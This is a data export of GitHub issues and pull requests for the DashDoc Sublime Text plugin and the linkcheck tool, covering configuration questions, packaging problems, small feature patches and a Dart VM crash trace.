farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/27,29002892,MDExOlB1bGxSZXF1ZXN0MTMzMzE5MTU=,27,"Add Mongoose, Grunt and Rust",1445635,closed,FALSE,NA,NA,1,2014-03-07T22:12:27Z,2014-06-12T19:51:42Z,2014-03-08T09:52:15Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/27/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/27/comments,https://api.github.com/repos/farcaller/DashDoc/issues/27/events,https://github.com/farcaller/DashDoc/pull/27,https://api.github.com/repos/farcaller/DashDoc/pulls/27
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/26,27224850,MDU6SXNzdWUyNzIyNDg1MA==,26,Dash Sublime Settings,466560,closed,FALSE,NA,NA,5,2014-02-09T15:55:16Z,2017-12-14T15:54:18Z,2017-12-14T15:54:18Z,NONE,NA,"i read the article about https://sublime.wbond.net/packages/DashDoc 
I setup everything and it worked as described, but i have a problem to setup the individual syntax to docket setting.

At the moment i override the html docset in DashDoc.sublime-settings - DashDock  like that to keep your default settings in the file.

```
    ""HTML""                  : [""html"",""css"",""ee"",""foundation""], // ""svg"", ""css"", ""bootstrap"", ""foundation"", ""javascript"", ""jquery"", ""jqueryui"", ""jquerym"", ""angularjs"", ""backbone"", ""marionette"", ""meteor"", ""moo"", ""prototype"", ""ember"", ""lodash"", ""underscore"", ""sencha"", ""extjs"", ""knockout"", ""zepto"", ""cordova"", ""phonegap"", ""yui""
```

because it didn't worked for me to override this settings in my xxx.sublime-project like that

```
{
    ""folders"":
    [
        {
            ""path"": ""/Users/pog/webserver/project_xx""
        }
    ],
    ""settings"": {
      ""syntax_docset_map"": {
        ""HTML"" : [""html"",""css"",""ee"",""foundation""]
      }
    }
}
```

everytime i tried it before without to manipulate your default settings it didn't worked out for me.
Any ideas why?

I also tried out to override the user settings of DashDock but that also didn't work.

Any help with that would be great.

Best Peter
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/26/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/26/comments,https://api.github.com/repos/farcaller/DashDoc/issues/26/events,https://github.com/farcaller/DashDoc/issues/26,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/25,25832391,MDExOlB1bGxSZXF1ZXN0MTE2MzQ2MDk=,25,Map Appcelerator doctypes,2699409,closed,FALSE,NA,NA,12,2014-01-17T19:54:53Z,2014-06-27T03:03:47Z,2014-01-18T09:07:44Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/25/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/25/comments,https://api.github.com/repos/farcaller/DashDoc/issues/25/events,https://github.com/farcaller/DashDoc/pull/25,https://api.github.com/repos/farcaller/DashDoc/pulls/25
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/24,25289364,MDExOlB1bGxSZXF1ZXN0MTEzNDc5MTc=,24,Add sublime_text version selectors,931051,closed,FALSE,NA,NA,0,2014-01-09T03:05:12Z,2014-06-28T03:27:52Z,2014-01-09T10:19:35Z,CONTRIBUTOR,NA,"We require these now due to the confusion it caused in the past

Also removed redundant information because Package Control defaults to these anyway
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/24/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/24/comments,https://api.github.com/repos/farcaller/DashDoc/issues/24/events,https://github.com/farcaller/DashDoc/pull/24,https://api.github.com/repos/farcaller/DashDoc/pulls/24
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/23,24484034,MDExOlB1bGxSZXF1ZXN0MTA5MzEyNzU=,23,DashDoc and Dash v1.9.3,9559,closed,FALSE,693,NA,1,2013-12-18T11:25:33Z,2013-12-18T15:09:35Z,2013-12-18T15:03:12Z,CONTRIBUTOR,NA,"I have adapted DashDoc to follow Dash's (v1.9.3) new URL scheme.  

Other changes:
- Incoporated Dash's proposed default syntax-to-docset mapping
- Individual syntax-to-docset mappings can now be overridden in the `settings` of a project's `sublime-project` file 
- Syntax sensitivity is the default now

Let me know what you think.  Cheers and a merry christmas,
  —Torsten
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/23/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/23/comments,https://api.github.com/repos/farcaller/DashDoc/issues/23/events,https://github.com/farcaller/DashDoc/pull/23,https://api.github.com/repos/farcaller/DashDoc/pulls/23
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/22,24229370,MDU6SXNzdWUyNDIyOTM3MA==,22,New way for plugins to call Dash with keywords,1445635,closed,FALSE,NA,NA,6,2013-12-13T06:14:56Z,2014-03-20T19:26:06Z,2014-03-20T19:26:06Z,CONTRIBUTOR,NA,"Dash 1.9.3 comes with a new way for plugins to call Dash and send over a list of keywords which Dash uses to enable/disable docsets.

This is all described at http://kapeli.com/dash_plugins.

In the next weeks I'll go through all plugins and update them myself, so expect a pull request regarding this. However, if you have some free time and want to do it yourself, feel free to do so :+1:.

Note: please do not release a new version of the ST plugin for at least 2-4 weeks, so that Dash users have time to update to 1.9.3.
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/22/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/22/comments,https://api.github.com/repos/farcaller/DashDoc/issues/22/events,https://github.com/farcaller/DashDoc/issues/22,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/21,22810657,MDExOlB1bGxSZXF1ZXN0MTAwMzYzOTk=,21,Link to kapeli.com/dash instead of App Store,1445635,closed,FALSE,NA,NA,0,2013-11-18T01:36:06Z,2014-07-19T00:12:40Z,2013-11-18T08:22:05Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/21/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/21/comments,https://api.github.com/repos/farcaller/DashDoc/issues/21/events,https://github.com/farcaller/DashDoc/pull/21,https://api.github.com/repos/farcaller/DashDoc/pulls/21
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/20,21771193,MDU6SXNzdWUyMTc3MTE5Mw==,20,DashDocs plugin is not found anymore through Sublime Package Control,35230,closed,FALSE,NA,NA,5,2013-10-29T16:57:33Z,2015-01-16T14:13:20Z,2013-10-30T09:29:09Z,NONE,NA,"I search through the package control but I cannot find it anymore.
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/20/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/20/comments,https://api.github.com/repos/farcaller/DashDoc/issues/20/events,https://github.com/farcaller/DashDoc/issues/20,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/19,20864816,MDExOlB1bGxSZXF1ZXN0OTAyMjIxMg==,19,Let me search anything beforehand without selecting,178512,closed,FALSE,NA,NA,8,2013-10-11T12:06:01Z,2019-09-15T07:19:52Z,2019-09-15T07:19:52Z,NONE,NA,"I would like to be able to search anything in dash without having to select the text, sometimes I need to look an API before I actually write the code.

This is my proposed change, 

regards
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/19/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/19/comments,https://api.github.com/repos/farcaller/DashDoc/issues/19/events,https://github.com/farcaller/DashDoc/pull/19,https://api.github.com/repos/farcaller/DashDoc/pulls/19
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/18,20564629,MDExOlB1bGxSZXF1ZXN0ODg2MTE3Mw==,18,Add Go entries to syntax_docset_map,661618,closed,FALSE,NA,NA,0,2013-10-05T13:26:08Z,2014-07-21T03:12:09Z,2013-10-05T13:30:20Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/18/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/18/comments,https://api.github.com/repos/farcaller/DashDoc/issues/18/events,https://github.com/farcaller/DashDoc/pull/18,https://api.github.com/repos/farcaller/DashDoc/pulls/18
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/17,17923378,MDU6SXNzdWUxNzkyMzM3OA==,17,Please Support Sublime Text 3,1287238,closed,FALSE,NA,NA,5,2013-08-12T03:51:19Z,2013-08-15T20:54:30Z,2013-08-15T20:54:30Z,NONE,NA,"Please add support to Sublime Text 3.
Or if it had done that, please update the meta info in Package Control Repo. 

Now in ST3, DashDoc is not available in Repo.
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/17/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/17/comments,https://api.github.com/repos/farcaller/DashDoc/issues/17/events,https://github.com/farcaller/DashDoc/issues/17,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/16,17912586,MDU6SXNzdWUxNzkxMjU4Ng==,16,nodeload.github.com decommissioned?,1914715,closed,FALSE,NA,NA,1,2013-08-11T13:44:43Z,2013-08-11T13:56:36Z,2013-08-11T13:56:36Z,NONE,NA,"Hi there,

It appears that GitHub have decided to decommission their ""nodeload"" service, see this tweet from their support account:

![github support tweet](https://f.cloud.github.com/assets/1914715/943989/e68fceca-028b-11e3-9f7d-310f0ca71ffa.png)

This unfortunately breaks the Package Control install:

Package Control: Error downloading package. HTTP error 503 downloading https://nodeload.github.com/farcaller/DashDoc/zipball/master.

Is there any way you can host the code elsewhere and update the install recipe?

Let me know if I can help in any way.

Cheers,
Dave J
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/16/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/16/comments,https://api.github.com/repos/farcaller/DashDoc/issues/16/events,https://github.com/farcaller/DashDoc/issues/16,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/15,17093545,MDU6SXNzdWUxNzA5MzU0NQ==,15,Option-click or other Xcode-like shortcut?,858967,closed,FALSE,NA,NA,2,2013-07-23T10:21:08Z,2013-07-23T10:24:32Z,2013-07-23T10:23:36Z,NONE,NA,"Would love to be able to use an Xcode-like shortcut like Option-clicking a symbol in order to open the documentation for it. Is this possible?
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/15/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/15/comments,https://api.github.com/repos/farcaller/DashDoc/issues/15/events,https://github.com/farcaller/DashDoc/issues/15,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/14,15255521,MDExOlB1bGxSZXF1ZXN0NjE3ODE4OA==,14,fix Syntax sensitivity when current syntax is Ruby on Rails,1624768,closed,FALSE,NA,NA,1,2013-06-07T03:02:20Z,2014-07-31T20:13:04Z,2013-06-07T07:30:20Z,CONTRIBUTOR,NA," Try running the following command in show panel(ctrl+backquote)

```
>>> import sublime
>>> import sublime_plugin
>>> import os
>>> import subprocess
>>> syntax = os.path.basename(view.settings().get('syntax'))
>>> syntax = os.path.splitext(syntax)[0]
>>> syntax
u'Ruby on Rails'
```
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/14/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/14/comments,https://api.github.com/repos/farcaller/DashDoc/issues/14/events,https://github.com/farcaller/DashDoc/pull/14,https://api.github.com/repos/farcaller/DashDoc/pulls/14
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/13,13879797,MDU6SXNzdWUxMzg3OTc5Nw==,13,not found in sublime package control,113969,closed,FALSE,NA,NA,3,2013-05-02T07:18:59Z,2014-05-08T16:07:10Z,2013-07-23T10:23:51Z,NONE,NA,"is DashDoc renamed to something else?
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/13/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/13/comments,https://api.github.com/repos/farcaller/DashDoc/issues/13/events,https://github.com/farcaller/DashDoc/issues/13,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/12,13234721,MDExOlB1bGxSZXF1ZXN0NTE4MDM2MQ==,12,Add Installation notes,1445635,closed,FALSE,NA,NA,0,2013-04-16T07:41:18Z,2013-04-16T07:58:07Z,2013-04-16T07:58:07Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/12/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/12/comments,https://api.github.com/repos/farcaller/DashDoc/issues/12/events,https://github.com/farcaller/DashDoc/pull/12,https://api.github.com/repos/farcaller/DashDoc/pulls/12
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/11,13216417,MDExOlB1bGxSZXF1ZXN0NTE3MTA4MA==,11,syntax_sensitive Swaps Key Bindings Edit,1445635,closed,FALSE,NA,NA,1,2013-04-15T19:43:02Z,2013-04-15T20:32:03Z,2013-04-15T20:32:03Z,CONTRIBUTOR,NA,"Just relaying this, see https://github.com/Kapeli/DashDoc/pull/2#issuecomment-16406449.
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/11/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/11/comments,https://api.github.com/repos/farcaller/DashDoc/issues/11/events,https://github.com/farcaller/DashDoc/pull/11,https://api.github.com/repos/farcaller/DashDoc/pulls/11
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/10,13159681,MDExOlB1bGxSZXF1ZXN0NTE0NzM1Mg==,10,Make use of Dash's new CamelCase convention to lookup words that contain whitespace,9559,closed,FALSE,NA,NA,1,2013-04-13T17:17:06Z,2013-04-13T17:39:07Z,2013-04-13T17:39:02Z,CONTRIBUTOR,NA,"Recently, Dash has introduced a new convention that allows the reliable lookup of entries that contain whitespace:

> To lookup `foo bar`, perform a Dash search for `fooBar`.  Internally, Dash will convert back and correctly search for `foo bar` entries in its docsets.

Such lookups of multiple (whitespace-separated) words didn't work correctly before.
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/10/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/10/comments,https://api.github.com/repos/farcaller/DashDoc/issues/10/events,https://github.com/farcaller/DashDoc/pull/10,https://api.github.com/repos/farcaller/DashDoc/pulls/10
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/9,12879206,MDU6SXNzdWUxMjg3OTIwNg==,9,User preference not taking,338975,closed,FALSE,NA,NA,1,2013-04-06T15:35:34Z,2013-04-08T14:46:40Z,2013-04-08T14:46:40Z,NONE,NA,"Under osx have set ""syntax_sensitive"": true, in user prefs but the search is not syntax sensitive.

If I change the DashDoc prefs it works as expected.

Any ideas ?

Thanks
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/9/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/9/comments,https://api.github.com/repos/farcaller/DashDoc/issues/9/events,https://github.com/farcaller/DashDoc/issues/9,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/8,12822971,MDU6SXNzdWUxMjgyMjk3MQ==,8,Sublime Text 3 Support,1467411,closed,FALSE,NA,NA,5,2013-04-04T22:06:01Z,2015-03-17T06:18:13Z,2013-04-15T19:31:19Z,NONE,NA,"Looking forward to it :)
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/8/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/8/comments,https://api.github.com/repos/farcaller/DashDoc/issues/8/events,https://github.com/farcaller/DashDoc/issues/8,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/7,12740469,MDU6SXNzdWUxMjc0MDQ2OQ==,7,Does this support Sublime Text 2 on Ubuntu?,1487879,closed,FALSE,NA,NA,1,2013-04-03T07:22:56Z,2013-04-03T07:25:17Z,2013-04-03T07:25:17Z,NONE,NA,"When I install it on Ubuntu, the console said:

```
Package Control: The package ""DashDoc"" is not available on this platform.
```

Will it support Ubuntu in future? 
Thanks!
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/7/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/7/comments,https://api.github.com/repos/farcaller/DashDoc/issues/7/events,https://github.com/farcaller/DashDoc/issues/7,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/6,12098600,MDU6SXNzdWUxMjA5ODYwMA==,6,Old version in Package Control,170270,closed,FALSE,NA,NA,1,2013-03-16T18:31:20Z,2013-04-15T19:30:45Z,2013-04-15T19:30:45Z,NONE,NA,"The version in package control is from July 17th 2012 and is missing Main.sublime-menu

Can you update `version` and `last_modified` in packages.json?
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/6/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/6/comments,https://api.github.com/repos/farcaller/DashDoc/issues/6/events,https://github.com/farcaller/DashDoc/issues/6,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/5,11991682,MDU6SXNzdWUxMTk5MTY4Mg==,5,How about getting this into Package Control?,79,closed,FALSE,NA,NA,2,2013-03-13T20:19:01Z,2013-04-15T19:31:30Z,2013-04-15T19:31:30Z,NONE,NA,"I manage all plugins (many do the same) in Package Control. Any chance you could get this in there?
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/5/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/5/comments,https://api.github.com/repos/farcaller/DashDoc/issues/5/events,https://github.com/farcaller/DashDoc/issues/5,NA
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/4,11276061,MDExOlB1bGxSZXF1ZXN0NDI2OTY4Ng==,4,Change default keybind,31448,closed,FALSE,NA,NA,1,2013-02-22T07:08:37Z,2013-04-15T19:33:07Z,2013-04-15T19:33:07Z,NONE,NA,"`ctrl+h` is often used as a backspace in many OSX applications.
I think it may be better to bind another key combination as a default.
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/4/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/4/comments,https://api.github.com/repos/farcaller/DashDoc/issues/4/events,https://github.com/farcaller/DashDoc/pull/4,https://api.github.com/repos/farcaller/DashDoc/pulls/4
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/3,10314708,MDExOlB1bGxSZXF1ZXN0Mzg0MTMyMA==,3,Fixed location of user-specific settings and key bindings files in ST2 menu,9559,closed,FALSE,NA,NA,0,2013-01-25T15:30:58Z,2014-07-26T17:41:54Z,2013-01-25T15:32:14Z,CONTRIBUTOR,NA,"Fixes a glitch in the ST2 menu description.

Sorry for that and thanks for the super-quick merge!
   --Torsten
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/3/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/3/comments,https://api.github.com/repos/farcaller/DashDoc/issues/3/events,https://github.com/farcaller/DashDoc/pull/3,https://api.github.com/repos/farcaller/DashDoc/pulls/3
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/2,10313651,MDExOlB1bGxSZXF1ZXN0Mzg0MDc3NA==,2,Added syntax sensitivity to DashDoc,9559,closed,FALSE,NA,NA,1,2013-01-25T15:02:21Z,2014-07-20T03:39:11Z,2013-01-25T15:04:58Z,CONTRIBUTOR,NA,"Hi Vladimir,

I've been using your DashDoc package for Sublime Text 2 for quite some time now and I love it!

With this commit I have added syntax sensitivity to DashDoc: users have the option to let Dash search only the docset that is relevant to the syntax of the current view (looking up `map` means something different for Haskell and Python buffers).

I tried to be non-invasive: syntax sensitivity is off by default and DashDoc's key binding `Ctrl-h` has not been changed.  I have edited the README to reflect the changes and listed the new option.  I have also added menu entries under ST2's _Preferences_ menu and added DashDoc to the editor's command palette.

Let me know what you think.  

Cheers and greetings from Germany,
   —Torsten
- DashDoc can now instruct Dash to consult a a docset specific to the syntax of the current view (default: off; a mapping between syntax and docset can be provided)
- Added key binding Ctrl-Alt-H to enable syntax sensitivity in a one-off fashion
- Added DashDoc settings file
- Added DashDoc entry under ST2's preferences menu
- Added DashDoc commands to ST2' command palette
- Adapted the README
",NA,TRUE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/2/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/2/comments,https://api.github.com/repos/farcaller/DashDoc/issues/2/events,https://github.com/farcaller/DashDoc/pull/2,https://api.github.com/repos/farcaller/DashDoc/pulls/2
farcaller,DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/1,6602710,MDU6SXNzdWU2NjAyNzEw,1,Language context search,895596,closed,FALSE,NA,NA,3,2012-09-02T13:47:07Z,2013-01-25T15:05:25Z,2013-01-25T15:05:25Z,NONE,NA,"Hi, although I do not know completely the dash syntax, it seems a way filtering to only the language syntax is dash://lang:word or dash://lang:{word}, then I've added:

```
    syntax = self.view.settings().get('syntax').split('/')[-1].split('.')[0]
    webbrowser.open_new_tab(""dash://%s:%s"" % (syntax,word,))
```
",NA,FALSE,https://api.github.com/repos/farcaller/DashDoc,https://api.github.com/repos/farcaller/DashDoc/issues/1/labels{/name},https://api.github.com/repos/farcaller/DashDoc/issues/1/comments,https://api.github.com/repos/farcaller/DashDoc/issues/1/events,https://github.com/farcaller/DashDoc/issues/1,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/72,827585244,MDU6SXNzdWU4Mjc1ODUyNDQ=,72,github actions: Unable to pass -e,300342,open,FALSE,NA,NA,1,2021-03-10T11:31:23Z,2021-03-11T03:36:28Z,NA,NONE,NA,"It's not possible to pass both `-e` and a URI as arguments when using this as a github actions, as  https://github.com/filiph/linkcheck/blob/5090e8c7080c17056e12e318b5c546c53849dc75/action.yml#L16 passes it all as a single argument with spaces. Unfortunately https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#runsargs looks like this can't be done easily. :-/

I worked it around by forking and adding the flag manually, but that's a terrible hack: https://github.com/liskin/linkcheck/commit/2d34f2f6ab3c7553a319081064ae2b2619744777",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/72/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/72/comments,https://api.github.com/repos/filiph/linkcheck/issues/72/events,https://github.com/filiph/linkcheck/issues/72,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/71,826834666,MDU6SXNzdWU4MjY4MzQ2NjY=,71,Are the HTML-pages cached?,5709480,closed,FALSE,NA,NA,3,2021-03-10T00:09:57Z,2021-03-10T21:57:03Z,2021-03-10T21:57:03Z,NONE,NA,"Hello, thanks for your work.

I have some questions:
1. Are  HTML-pages cached.
2. If yes, where?
3. If not, what code to add and where for caching them? 

Cheers,
Lyric ;-)",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/71/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/71/comments,https://api.github.com/repos/filiph/linkcheck/issues/71/events,https://github.com/filiph/linkcheck/issues/71,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/70,822108059,MDExOlB1bGxSZXF1ZXN0NTg0Nzg1OTg4,70,Fix github action example in readme,3065968,closed,FALSE,NA,NA,0,2021-03-04T12:57:00Z,2021-03-04T21:32:15Z,2021-03-04T21:32:15Z,CONTRIBUTOR,NA,the name of the action in the readme was invalid,NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/70/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/70/comments,https://api.github.com/repos/filiph/linkcheck/issues/70/events,https://github.com/filiph/linkcheck/pull/70,https://api.github.com/repos/filiph/linkcheck/pulls/70
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/69,812706623,MDU6SXNzdWU4MTI3MDY2MjM=,69,All are exe in releases,17668509,closed,FALSE,NA,NA,1,2021-02-20T21:05:34Z,2021-02-28T05:01:59Z,2021-02-28T05:01:59Z,NONE,NA,"Hi, in the release section mac and linux releases are also in exe extension.

Please fix it",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/69/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/69/comments,https://api.github.com/repos/filiph/linkcheck/issues/69/events,https://github.com/filiph/linkcheck/issues/69,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/68,804125135,MDU6SXNzdWU4MDQxMjUxMzU=,68,"error: Invalid cid: 0, obj: 0x14c1fe100068, tags: 65. Corrupt heap?",7416604,open,FALSE,NA,NA,2,2021-02-09T02:04:27Z,2021-02-10T00:13:04Z,NA,NONE,NA,"docker run -it -v ""$(pwd)/skipfiles/:/skipfiles/"" filiph/linkcheck:latest --skip-file ./skipfiles/ignor.txt https://site.com

Crawling: 1532../../runtime/vm/raw_object.cc: 365: error: Invalid cid: 0, obj: 0x14c1fe100068, tags: 65. Corrupt heap?
version=2.10.5 (stable) (Unknown timestamp) on ""linux_x64""
pid=6, thread=40, isolate_group=worker(0x558a812ebb80), isolate=(nil)((nil))
isolate_instructions=558a7fdecbc0, vm_instructions=558a7fdecbc0
  pc 0x0000558a8007cc0c fp 0x000014ca1a37c520 dart::Profiler::DumpStackTrace(void*)+0x7c
  pc 0x0000558a7fdeccf2 fp 0x000014ca1a37c600 dart::Assert::Fail(char const*, ...)+0x82
  pc 0x0000558a8008fc79 fp 0x000014ca1a37c630 dart::ObjectLayout::VisitPointersPredefined(dart::ObjectPointerVisitor*, long)+0x4f9
  pc 0x0000558a8012981f fp 0x000014ca1a37c6b0 dart::GCMarker::IterateRoots(dart::ObjectPointerVisitor*)+0xff
  pc 0x0000558a8012b00c fp 0x000014ca1a37c750 dart+0x1ce300c
  pc 0x0000558a8012a58d fp 0x000014ca1a37c870 dart::GCMarker::MarkObjects(dart::PageSpace*)+0x21d
  pc 0x0000558a8012fb8f fp 0x000014ca1a37c9b0 dart::PageSpace::CollectGarbageHelper(bool, bool, long, long)+0x23f
  pc 0x0000558a8012f910 fp 0x000014ca1a37ca20 dart::PageSpace::CollectGarbage(bool, bool)+0x150
  pc 0x0000558a80126907 fp 0x000014ca1a37cb40 dart::Heap::CollectOldSpaceGarbage(dart::Thread*, dart::Heap::GCType, dart::Heap::GCReason)+0x247
  pc 0x0000558a80125d7a fp 0x000014ca1a37cbc0 dart::Heap::AllocateOld(long, dart::OldPage::PageType)+0x24a
  pc 0x0000558a7fffc5dc fp 0x000014ca1a37cc10 dart::Object::Allocate(long, long, dart::Heap::Space)+0x6c
  pc 0x0000558a7fffd9e2 fp 0x000014ca1a37cc40 dart::Array::New(long, dart::Heap::Space)+0x32
  pc 0x0000558a800c97a7 fp 0x000014ca1a37ccf0 dart::DRT_AllocateArray(dart::NativeArguments)+0x107
  pc 0x000014ca28c81413 fp 0x000014ca1a37cd30 Unknown symbol
  pc 0x000014ca28c80c1c fp 0x000014ca1a37cd68 Unknown symbol
  pc 0x000014ca144d9db8 fp 0x000014ca1a37cdb8 Unknown symbol
  pc 0x000014ca144d1717 fp 0x000014ca1a37ce38 Unknown symbol
  pc 0x000014ca1448bfe4 fp 0x000014ca1a37ce98 Unknown symbol
  pc 0x000014ca00ec13dc fp 0x000014ca1a37cef0 Unknown symbol
  pc 0x000014ca00ec1c59 fp 0x000014ca1a37d0d8 Unknown symbol
  pc 0x000014ca1d97eddb fp 0x000014ca1a37d178 Unknown symbol
  pc 0x000014ca1b38b015 fp 0x000014ca1a37d1d8 Unknown symbol
  pc 0x000014ca1b38cf56 fp 0x000014ca1a37d258 Unknown symbol
  pc 0x000014ca1b389566 fp 0x000014ca1a37d2c8 Unknown symbol
  pc 0x000014ca1d94893c fp 0x000014ca1a37d310 Unknown symbol
  pc 0x000014ca1d9796b6 fp 0x000014ca1a37d350 Unknown symbol
  pc 0x000014ca1d926284 fp 0x000014ca1a37d3b8 Unknown symbol
  pc 0x000014ca1d925ed2 fp 0x000014ca1a37d3f8 Unknown symbol
  pc 0x000014ca1d924b02 fp 0x000014ca1a37d450 Unknown symbol
  pc 0x000014ca1d9247c4 fp 0x000014ca1a37d488 Unknown symbol
  pc 0x000014ca1d978a08 fp 0x000014ca1a37d4c0 Unknown symbol
  pc 0x000014ca1d9788a9 fp 0x000014ca1a37d4f8 Unknown symbol
  pc 0x000014ca1d9795c9 fp 0x000014ca1a37d530 Unknown symbol
  pc 0x000014ca1d979147 fp 0x000014ca1a37d570 Unknown symbol
  pc 0x000014ca1d9780e9 fp 0x000014ca1a37d5a8 Unknown symbol
  pc 0x000014ca1d977f9a fp 0x000014ca1a37d608 Unknown symbol
  pc 0x000014ca1d977e58 fp 0x000014ca1a37d640 Unknown symbol
